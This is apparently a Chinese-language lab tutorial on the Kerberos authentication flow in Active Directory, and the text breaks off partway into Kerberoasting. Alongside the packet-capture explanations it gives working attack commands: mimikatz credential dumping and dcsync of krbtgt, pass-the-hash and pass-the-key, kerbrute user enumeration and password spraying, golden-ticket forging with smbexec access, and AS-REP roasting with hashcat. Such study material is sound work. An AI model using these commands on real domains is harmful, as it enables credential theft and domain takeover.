<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c7c3cda2418945a66e2280cd4993e29e.png"></p>
<p>krbtgt用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成的，无法登录主机</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/15b8d9bb93995137ffc4ef172abbd3e6.png"></p>
<p>windows密码hash图解如下</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fc59a89ef335a7a40849a7b47723418f.jpeg"></p>
<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h1><p>AS-REQ：当域内某个用户试图访问域中的某个服务，输入用户名和密码，本机的kerberos服务向KDC的AS认证服务发送一个AS-REQ认证请求，请求中包含：请求的用户名、客户端主机名、加密类型和Authenticator（用户NTML Hash加密的时间戳）以及其他的一些信息</p>
<h2 id="wireshark抓包分析"><a href="#wireshark抓包分析" class="headerlink" title="wireshark抓包分析"></a>wireshark抓包分析</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ee7f0aaceaa0978c09ccb33d0ce90e40.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5efa1f10962c15913294735e2cdb1714.png"></p>
<h2 id="req-body详细请求包"><a href="#req-body详细请求包" class="headerlink" title="req-body详细请求包"></a>req-body详细请求包</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c02fa8bc494fcce131e171e4b022ea0d.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pvno:kerberos版本号，这里为5</span><br><span class="line"></span><br><span class="line">msg-type:消息类型，AS_REQ对应的是krb-as-req(10)</span><br><span class="line"></span><br><span class="line">padata:主要是一些认证信息，每个认证消息有type和value</span><br><span class="line"></span><br><span class="line">　　PADA PA-ENC-TIMESTAMP:预认证，用用户hash加密时间戳，作为value发送给AS服务器，AS服务器拥有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过。由于用户密码是hash加密，所以能够利用hash传递</span><br><span class="line"></span><br><span class="line">　　　　padata-type:padata类型，这里是KRB5-PADATA-ENC-TIMESTAMP(2)</span><br><span class="line">　　　　padata-value:padata的值</span><br><span class="line">　　　　　　etype:padata类型，这里是eTYPE-AES256-CTS-HMAC-SHA1-96(18)</span><br><span class="line">　　　　　　cipher:密钥</span><br><span class="line"></span><br><span class="line">　　PADA PA-PAC-REQUEST:启用PAC支持的扩展。PAC并不在原生的kerberos里面，是微软引进的拓展。PAC包含在相应包AS_REP中，这里的value对应的值为True或False，KDC根据include的值来确定返回的票据中是否需要携带PAC</span><br><span class="line"></span><br><span class="line">　　　　padata-type:padata类型，这是eTYPE-AES256-CTS-HMAC-SHA1-96(18)</span><br><span class="line">　　　　　　padata-value:padata的值</span><br><span class="line">　　　　　　　　include-PAC:是否包含PAC，这里为True</span><br><span class="line">req-body:请求body</span><br><span class="line"></span><br><span class="line">　　padding:填充，这里为0</span><br><span class="line"></span><br><span class="line">　　kdc-options:用于与KDC预定一些选项设置</span><br><span class="line"></span><br><span class="line">　　cname:客户端用户名，这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名，PrincipalName类型，包含type和Value</span><br><span class="line"></span><br><span class="line">　　　　name-type:名字类型，这里是KRB5-NT-PRINCIPAL(1)</span><br><span class="line">　　　　cname-string:名字，也就是请求的用户名</span><br><span class="line">　　　　　　CNameString:请求的用户名，这里为mars2</span><br><span class="line"></span><br><span class="line">　　realm:域名，这里为DRUNKMARS0</span><br><span class="line"></span><br><span class="line">　　sname:服务端用户名，PrincipalName类型，包含type和value，在AS-REQ里面snames为krbtgt</span><br><span class="line">　　　　SNameString:这里是用户名 krbtgt</span><br><span class="line">　　　　SNameString:这里是域名 DRUNKMARS0</span><br><span class="line">　　till:到期时间，rubeus和kekeo都是20370913024805Z，这个可以作为特征来检测工具</span><br><span class="line"></span><br><span class="line">　　rtime:到期时间</span><br><span class="line"></span><br><span class="line">　　nonce:随机生成的一个数，kekeo/mimikatz nonce是12381973，rubeus nonce是1818848256，这个也可以用来作为特征检测工具</span><br><span class="line"></span><br><span class="line">　　etype:加密类型，这里有6个items</span><br><span class="line"></span><br><span class="line">　　address:客户端的请求地址，也就是客户端的主机名</span><br><span class="line"></span><br><span class="line">　　　　HostAddress MESSI-PC&lt;20&gt;</span><br><span class="line">　　　　　　ddr-type:地址类型，这里是nETBIOS(20)</span><br><span class="line">　　　　　　NetBIOS Name:MESSI-PC&lt;20&gt; (Server service)</span><br></pre></td></tr></table></figure>

<p><code>net config workstation</code> 查看域内信息</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/818575d7697eab236d09c44f055ec8bf.png"></p>
<h1 id="AS-REQ过程中的攻击方式"><a href="#AS-REQ过程中的攻击方式" class="headerlink" title="AS-REQ过程中的攻击方式"></a>AS-REQ过程中的攻击方式</h1><h2 id="hash传递"><a href="#hash传递" class="headerlink" title="hash传递"></a>hash传递</h2><h3 id="msf进行hash传递"><a href="#msf进行hash传递" class="headerlink" title="msf进行hash传递"></a>msf进行hash传递</h3><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3c4a2df22648ce229ad51df99c84ecd7.png"></p>
<p>只适用于域环境，并且目标主机需要安装 KB2871997补丁</p>
<h3 id="mimikatz进行hash传递"><a href="#mimikatz进行hash传递" class="headerlink" title="mimikatz进行hash传递"></a>mimikatz进行hash传递</h3><p>这里mimikatz获取到hash之后不能复制粘贴，这时可以将获取到的hash导出到log日志中，命令如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log privilege::debug sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/be4c7ceb55b306da945a484b1a20e089.png"></p>
<p>抓取sid为500的administrator的ntlm哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/b3950c86772def3136dd8d72b1426cae.png"></p>
<p>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:192.168.10.5 /ntlm:7c64e7ebf46b9515c56b2dd522d21c1c</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/df6d133c4d0b7c1114b6f6b0b3c0b9da.png"></p>
<h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h3><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/669381747493bdc00a432e07189d8d13.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/f246613b27b5848cb09ec1dafd103c93.png"></p>
<p>安装KB2871997这个补丁之后，只能用sid为500的管理员账户进行pass hash</p>
<h3 id="PTK-pass-the-key"><a href="#PTK-pass-the-key" class="headerlink" title="PTK(pass the key)"></a>PTK(pass the key)</h3><p>获取aes-key:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/11316c8e9906eb7af3056780a4367f14.png"></p>
<p>注入aes-key:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:Drunkmars.com /aes256:cf5dba161f3a3dc89454742ff5db89980d6b07e771048b30006546e81d1d79e2</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/7f0d73f92b21f61627deee0c01ff7196.png"></p>
<h2 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h2><p>使用kerbrute工具：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe">https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe</a></p>
<p>前提需要DC需要开启kerberos 88端口</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/4dc180a7a281b9d1a7452812c0e05c56.png"></p>
<p>准备用户名保存为txt</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/77a99082f73b40c79eebb569b8c91c7c.png"></p>
<p>使用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.10.5 -d Drunkmars.com user.txt</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/a056fd59503431a0cf4e22f52bbab7f2.png"></p>
<p>使用kerbrute进行错误枚举的原理就是kerberos有三种错误代码：</p>
<p>KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）</p>
<p>KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）</p>
<p>KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）</p>
<p>在DC抓包可以看到有4个UNKNOWN，1个REQUIRED，证明有这个用户名存在</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/a8f728776b1b9c57f895fc43d67790be.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/0234fc1db59b4ae90219e23766111edc.png"></p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>当用户名存在，密码正确和错误返回的包是不相同的，所以知道用户名的情况下可以用一个相同的密码去爆破用户，这种针对所有用户的自动密码猜测是为了防止账户被锁定，因为针对同一个用户连续密码猜测很容易导致账户被锁。所以只有对所有用户同时执行特定的密码进行尝试，才能增加破解的概率，消除帐号被锁定的可能</p>
<p>使用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.5 -d Drunkmars.com user.txt Fcb0519..</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c20fc7736909c4e361b29e671a663d13.png"></p>
<p>密码同样存在三种错误代码</p>
<p>KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）</p>
<p>KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）</p>
<p>KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）</p>
<p>同样在DC抓包，有4个UNKNOWN，1个REQUIRED</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/aff8da1884a284235fc3a5733dd50983.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6f34cb6eac31f2c7f3123aadb539f816.png"></p>
<h1 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h1><p><strong>AS-REP</strong>:当KDC接受到请求之后，通过AD活动目录查询得到该用户的密码hash，用该密码hash对请求包的Authenticator进行解密，如果解密成功，则证明请求者提供的密码正确，而且需要时间戳范围在五分钟内，且不是重放，则域认证成功。KAS成功认证对方的身份之后，发送相应包给客户端，响应包中主要包括krbtgt用户的NTLM hash加密后的TGT认购权证（即ticket这部分）和用户NTLM hash加密的Login Session key（即最外层enc-part这部分）以及一些其他信息。该Login Session key的作用是用于确保客户端和KDC下阶段之间通信安全。最后TGT认购权证，加密的Login Session Key、时间戳和PAC等信息会发送给客户端。PAC中包含用户的SID，用户所在的组等一些信息。</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/a92e1d19c7bce368c0e529604fbbe15f.png"></p>
<p>在enc-part里面最重要的字段就是Login session key，作为下阶段的认证密钥</p>
<p>AS-REP中最核心的东西就是Login session-key 和加密的 ticket。正常我们用工具生成的凭据是.ccache和.kirbi后缀的，用mimikatz，kekeo，rebeus生成的凭据是.kirbi后缀的，impacket生成的凭据是.ccache，两种票据主要包含的都是Login session-key 和加密的 ticket，因此可以相互转换</p>
<h1 id="AS-REP中的攻击方式"><a href="#AS-REP中的攻击方式" class="headerlink" title="AS-REP中的攻击方式"></a>AS-REP中的攻击方式</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h3><p>先获取krbtgt hash</p>
<p>DC执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:Drunkmars.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/f52a49dc9dd9d12fd20243275a1c34ba.png"></p>
<p>获得如下信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sid:S-1-5-21-652679085-3170934373-4288938398-502</span><br><span class="line"></span><br><span class="line">ntlm hash:c1833c0783cfd81d3548dd89b017c99a</span><br><span class="line"></span><br><span class="line">aes256:2ec7a180207fea5ede74f482b365885d3bf6ad764082d13113e9e4b98c14ba50</span><br></pre></td></tr></table></figure>
<p>伪造administrator执行(aes256)生成gold.kirbi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:Drunkmars.com /sid:S-1-5-21-652679085-3170934373-4288938398-502 /aes256:2ec7a180207fea5ede74f482b365885d3bf6ad764082d13113e9e4b98c14ba50 /user:administrator /ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/0910c87762ffaf7d54060c0435a628c4.png"></p>
<p>伪造administrator执行(krbtgt hash)生成gold.kirbi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:Drunkmars.com /sid:S-1-5-21-652679085-3170934373-4288938398-502 /krbtgt:c1833c0783cfd81d3548dd89b017c99a /user:administrator /ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1ba77627d1dce06e2906a83b8bc36403.png"></p>
<p>导入golden.kirbi，执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\\Users\\mars2\\Desktop\\gold.kirbi</span><br></pre></td></tr></table></figure>
<p>查看本地缓存，发现凭据成功导入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/d8b2884e4a324e31094f90cffdfc4cad.png"></p>
<p>打开新的cmd，用klist查看凭证</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/80bf1f339a2fe8f62742cfe6324b9270.png"></p>
<p>dir连接过去，注意这里必须要主机名，不能够用IP连接</p>
<p>这里有一个坑，必须要管理员权限开cmd，不然也会显示拒绝访问</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/7dc6755164513cc9b1552ca273b0c4a8.png"></p>
<p>看下权限，处于<code>Domain Users</code>组</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/30c77331cf617ed4a120e9b13fa32a9f.png"></p>
<p>查看所有组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /do</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/95378442907abdfd7719d7d172c4ce67.png"></p>
<p>查看Domain Controllers组，这里我在域用户机器上可以查看是因为我导入了金票，实际上这个命令只能在DC上才能查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /do</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1dbc38ccf5121ef1ca7d3ea6bd9da343.png"></p>
<p>删除凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/cafac45d8e89b32073d8b6734e0dfece.png"></p>
<h3 id="使用impacket"><a href="#使用impacket" class="headerlink" title="使用impacket"></a>使用impacket</h3><p>使用kali，不在域内需要把dns改向域控</p>
<p>先生成票据administrator.ccache</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -domain-sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">652679085</span>-<span class="number">3170934373</span>-<span class="number">4288938398</span>-<span class="number">502</span> -nthash c1833c0783cfd81d3548dd89b017c99a -domain Drunkmars.com administrator</span><br></pre></td></tr></table></figure>
<p>导入票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
<p>然后访问域控</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k WIN-M836NN6NU8B.Drunkmars.com</span><br></pre></td></tr></table></figure>
<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>在AS-REP阶段，最外层的enc-part是用户密码hash加密的。对于域用户，如果设置了”Do not require Kerberos preauthentication”，此时向域控的88端口发送AS-REP内容（enc-part底下的ciper，因为这部分是使用用户hash加密的Login Session Key，通过离线爆破就可以获得用户hash）重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以通过hashcat对其破解，最终获得明文密码，这就构成了AS-REP Roasting攻击</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/83ac789aef908198aaba33ab1764efd2.png"></p>
<p>默认这个功能是不启用的，如果启用AS-REP会返回用户hash加密的<code>sessionkey-as</code>，这样我们就能够用john离线破解</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/75cce52616800bccd645a31b6ad1083b.png"></p>
<p>使用Empire下的powerview.ps1查找域中设置了”不需要kerberos预认证”的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powerview.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6e001ff1599ac6d1cb049a47b38bea62.png"></p>
<p>使用ASREPRoast.ps1获取AS-REP返回的hash</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\ASREPRoast.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ASREPHash</span> <span class="literal">-Username</span> mars2 <span class="literal">-Domain</span> Drunkmars.com | <span class="built_in">Out-File</span> Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
<p>修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure>

<h1 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS-REQ"></a>TGS-REQ</h1><p>经过上面的步骤，客户端获得了 TGT认购权证 和 Login Session Key。然后用自己的密码NTLM Hash解密Login Session Key得到 原始的LogonSession Key。然后它会在本地缓存此 TGT认购权证 和 原始的Login Session Key。如果现在它需要访问某台服务器的某个服务，它就需要凭借这张TGT认购凭证向KDC购买相应的入场券ST服务票据（Service Ticket）。ST服务票据是通过KDC的另一个服务 TGS（Ticket Granting Service）出售的。在这个阶段，微软引入了两个扩展自协议 S4u2self 和 S4u2Proxy(当委派的时候，才用的到)</p>
<p><strong>TGS-REQ</strong>：客户端向KDC购买针对指定服务的ST服务票据请求，该请求主要包含如下的内容：客户端信息、Authenticator(Login Session Key加密的时间戳)、TGT认购权证(padata下ap-req下的ticket) 和 访问的服务名以及一些其他信息</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fe20190dac9bed68ff7d220cae71d558.png"></p>
<h1 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h1><p><strong>TGS-REP</strong>：TGS接收到请求之后，首先会检查自身是否存在客户端所请求的服务。如果服务存在，则通过 krbtgt 用户的NTLM Hash 解密TGT并得到Login Session Key，然后通过Login Session Key解密Authenticator，如果解密成功，则验证了对方的真实身份，同时还会验证时间戳是否在范围内。并且还会检查TGT中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同。</p>
<p>在完成上述的检测后，如果验证通过，则TGS完成了对客户端的认证，会生成一个用Logon Session Key加密后的用于确保客户端-服务器之间通信安全的Service Session Key会话秘钥(也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。</p>
<p>最终Service Session Key 和 ST服务票据发送给客户端。(这一步不管用户有没有访问服务的权限，只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据)</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ec8da490e415f85d77c48cfc8b100e8c.png"></p>
<p><strong>enc-part</strong>：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击。</p>
<h1 id="TGS-REP过程中的攻击方式"><a href="#TGS-REP过程中的攻击方式" class="headerlink" title="TGS-REP过程中的攻击方式"></a>TGS-REP过程中的攻击方式</h1><h2 id="何为SPN"><a href="#何为SPN" class="headerlink" title="何为SPN"></a>何为SPN</h2><p>SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。</p>
<p>Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。一个用户账户下可以有多个SPN，但一个SPN只能注册到一个账户。在内网中，SPN扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN的识别是kerberoasting攻击的第一步。</p>
<p>下面通过一个例子来说明SPN的作用：</p>
<p>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询SPN为MySQL的记录。当找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给KDC，并将需要访问的SPN发送给KDC。KDC中的TGS服务对TGT进行解密。确认无误后，由TGS将一张允许访问该SPN所对应的服务的ST服务票据和该SPN所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</p>
<p>SPN分为两种类型：</p>
<p>1.是注册在活动目录的机器帐户(Computers)下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户(Computers)下。域中的每个机器都会有注册两个SPN：HOST/主机名<br>和 HOST/主机名.Drunkmars.com</p>
<p>2.是注册在活动目录的域用户帐户(Users)下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
<p>查看当前域内所有的SPN：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-Q</span> \* \*</span><br></pre></td></tr></table></figure>
<p>查看指定域Drunkmars.com注册的SPN：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T Drunkmars.com -Q \* \*</span><br></pre></td></tr></table></figure>
<p>如果指定域不存在，则默认切换到查找本域的SPN</p>
<p>查找本域内重复的SPN：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -X</span><br></pre></td></tr></table></figure>
<p>删除指定SPN：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -D MySQL/win7.Drunkmars.com:1433/MSSQL hack</span><br></pre></td></tr></table></figure>
<p>查找指定用户/主机名注册的SPN：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L username/hostname</span><br></pre></td></tr></table></figure>
<h2 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h2><p>Kerberoast攻击过程：</p>
<p>1.攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证，该TGT认购权证用于以后的ST服务票据请求</p>
<p>2.攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。 在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。</p>
